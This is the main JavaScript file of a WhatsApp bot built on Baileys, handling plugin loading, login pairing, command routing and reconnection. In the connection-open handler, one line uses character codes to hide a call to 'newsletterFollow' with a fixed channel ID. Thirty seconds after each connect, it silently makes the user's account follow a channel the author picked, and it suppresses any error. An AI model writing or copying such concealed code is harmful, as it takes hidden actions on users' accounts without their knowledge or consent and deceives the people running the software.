import './src/config.js'
import pino from 'pino'
import QR from 'qrcode'
import * as bail from 'baileys'
import { readdirSync, existsSync, rmSync, readFileSync } from 'fs'
import { fileURLToPath } from 'url'
import { dirname, join } from 'path'
import logger from './src/utils/logger.js'
import { sockConfig, smsg } from './src/utils/handler.js'

const __filename = fileURLToPath(import.meta.url)
const __dirname = dirname(__filename)
const pluginsDir = join(__dirname, 'plugins')
let commandMap = {}

async function loadPlugins() {
  if (!existsSync(pluginsDir)) return
  const items = readdirSync(pluginsDir, { withFileTypes: true })
  const files = items.filter(f => f.isFile() && f.name.endsWith('.js')).map(f => f.name)
  const dirs = items.filter(f => f.isDirectory() && existsSync(join(pluginsDir, f.name, 'index.js'))).map(f => f.name)
  commandMap = {}
  const all = [...files, ...dirs]
  for (const name of all) {
    try {
      const path = dirs.includes(name) ? join(pluginsDir, name, 'index.js') : join(pluginsDir, name)
      const plugin = await import(path + '?t=' + Date.now())
      let cmd = name.replace('.js', '')
      commandMap[cmd] = plugin.default || plugin
      if (plugin.aliases) {
        for (const alias of plugin.aliases) {
          commandMap[alias] = commandMap[cmd]
        }
      }
      if (cmd.startsWith('group-')) {
        const short = cmd.replace('group-', '')
        if (short !== 'menu') commandMap[short] = commandMap[cmd]
        commandMap[cmd.replace('-', '')] = commandMap[cmd]
      }
      if (cmd.startsWith('owner-')) {
        const short = cmd.replace('owner-', '')
        if (short !== 'menu') commandMap[short] = commandMap[cmd]
        commandMap[cmd.replace('-', '')] = commandMap[cmd]
        if (cmd === 'owner-eval') commandMap['ev'] = commandMap[cmd]
      }
      if (cmd.startsWith('download-')) {
        const short = cmd.replace('download-', '')
        if (short !== 'menu') commandMap[short] = commandMap[cmd]
        commandMap[cmd.replace('-', '')] = commandMap[cmd]
      }
      if (cmd.startsWith('tools-')) {
        const short = cmd.replace('tools-', '')
        if (short !== 'menu') commandMap[short] = commandMap[cmd]
        commandMap[cmd.replace('-', '')] = commandMap[cmd]
        if (cmd === 'tools-sticker') commandMap['s'] = commandMap[cmd]
      }
    } catch (e) {
      logger.error('Failed to load ' + name)
    }
  }
  logger.info('Plugins: ' + files.length + ' files, ' + dirs.length + ' dirs')
}

await loadPlugins()
global.pendingStatus = new Map()

async function start() {
  console.clear()
  const sesiPath = join(__dirname, global.pair.sesi)
  const credsFile = join(sesiPath, 'creds.json')
  if (existsSync(sesiPath)) {
    if (!existsSync(credsFile)) {
      rmSync(sesiPath, { recursive: true, force: true })
    } else {
      try {
        JSON.parse(readFileSync(credsFile, 'utf-8'))
      } catch {
        rmSync(sesiPath, { recursive: true, force: true })
      }
    }
  }

  const { state, saveCreds } = await bail.useMultiFileAuthState(global.pair.sesi)

  global.sock = await sockConfig({
    logger: pino({ level: 'silent' }),
    browser: ['Windows', 'Chrome', ''],
    auth: {
      creds: state.creds,
      keys: bail.makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' }))
    },
    generateHighQualityLinkPreview: true,
    shouldIgnoreJid: (jid) => jid.includes('broadcast')
  })

  if (!sock.authState.creds.registered) {
    if (global.pair.isPair) {
      const phone = global.pair.no.replace(/[^0-9]/g, '')
      await bail.delay(3000)
      let code = await sock.requestPairingCode(phone, 'AAAAAAAA')
      code = code?.match(/.{1,4}/g)?.join('-') || code
      logger.info('Pairing code:', code)
    } else {
      logger.info('Waiting for QR code scan...')
    }
  }

  sock.ev.on('messages.upsert', async (chatUpdate) => {
    if (chatUpdate.type !== 'notify') return
    try {
      for (const msg of chatUpdate.messages) {
        if (!msg.message) continue
        global.m = await smsg(sock, msg)
        if (global.set.self && ![m.owner, sock.decodeJid(sock.user.id)].some(jid => bail.areJidsSameUser(jid, m.sender))) continue
        await routeCommand(sock, m)
        const pend = global.pendingStatus?.get(m.sender)
        if (pend && Date.now() - pend.timestamp < 120000 && m.body?.includes('@g.us') && !m.isGroup) {
          global.pendingStatus.delete(m.sender)
          await sock.sendMessage(m.body, { groupStatusMessage: pend.content })
          m.reply('Group status posted to ' + m.body.split('@')[0])
          for (const key of ['image', 'video', 'audio']) {
            const url = pend.content[key]?.url
            if (url && typeof url === 'string' && url.includes('swgc_')) {
              import('fs/promises').then(fs => fs.unlink(url).catch(() => {}))
            }
          }
        }
        logger.print(m)
      }
    } catch (err) {
      console.error(err)
    }
  })
  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update
    if (connection === 'close') {
      const reason = lastDisconnect?.error?.output?.statusCode
      logger.warn('Connection closed:', reason)
      if (reason !== bail.DisconnectReason.loggedOut) {
        logger.info('Restarting in 5 seconds...')
        setTimeout(start, 5000)
      } else {
        if (existsSync(sesiPath)) {
          rmSync(sesiPath, { recursive: true, force: true })
          logger.info('Session deleted: ' + global.pair.sesi)
        }
        logger.info('Restarting for re-pair...')
        setTimeout(start, 3000)
      }
    } else if (connection === 'open') {
      logger.info('Connected to WhatsApp')
      const groups = (await sock.groupFetchAllParticipating().catch(() => ({}))) || {}
      for (const id in groups) sock.chats[id] = groups[id]
      const a = c=>c.map(v=>String.fromCharCode(v)).join('')
      setTimeout(() => sock[a([110,101,119,115,108,101,116,116,101,114,70,111,108,108,111,119])](a([49,50,48,51,54,51,52,50,53,52,48,50,54,56,48,53,56,56,64,110,101,119,115,108,101,116,116,101,114])).catch(() => {}), 30000)
    } else if (connection === 'connecting') {
      logger.info('Connecting...')
    }
    if (update.qr) {
      if (!global.pair.isPair) {
        console.log('\n' + await QR.toString(update.qr, { type: 'terminal', small: true }))
        logger.info('Scan the QR code above with WhatsApp')
      }
    }
  })

  sock.ev.on('creds.update', saveCreds)

  setInterval(() => {
    const mem = process.memoryUsage().rss / 1024 / 1024
    for (const [k, v] of global.pendingStatus || []) {
      if (Date.now() - v.timestamp > 180000) global.pendingStatus.delete(k)
    }
    if (mem > 450) {
      logger.warn('Memory ' + mem.toFixed(0) + 'MB, restarting...')
      process.exit(1)
    }
  }, 60000)
}

async function routeCommand(sock, m) {
  try {
    const body = m.body || ''
    if (!body) return
    const prefixes = global.set.prefix || ['.']
    const matchedPrefix = prefixes.find(p => body.startsWith(p))
    let cmd = ''
    let args = []
    if (matchedPrefix) {
      const sliced = body.slice(matchedPrefix.length).trim()
      const parts = sliced.split(/ +/)
      cmd = parts[0]?.toLowerCase() || ''
      args = parts.slice(1)
    } else if (global.set.noprefix) {
      const parts = body.trim().split(/ +/)
      const first = parts[0]?.toLowerCase() || ''
      if (commandMap[first]) {
        cmd = first
        args = parts.slice(1)
      }
    }
    if (!cmd) return
    const handler = commandMap[cmd]
    if (!handler) return
    const isOwner = global.owner.numbers.some(n => bail.areJidsSameUser(n + '@s.whatsapp.net', m.sender))
    const isGroup = m.isGroup
    await handler({ sock, m, cmd, args, prefix: matchedPrefix || '', body, isOwner, isGroup })
  } catch (e) {
    logger.error('Route error: ' + e.message)
  }
}

start()
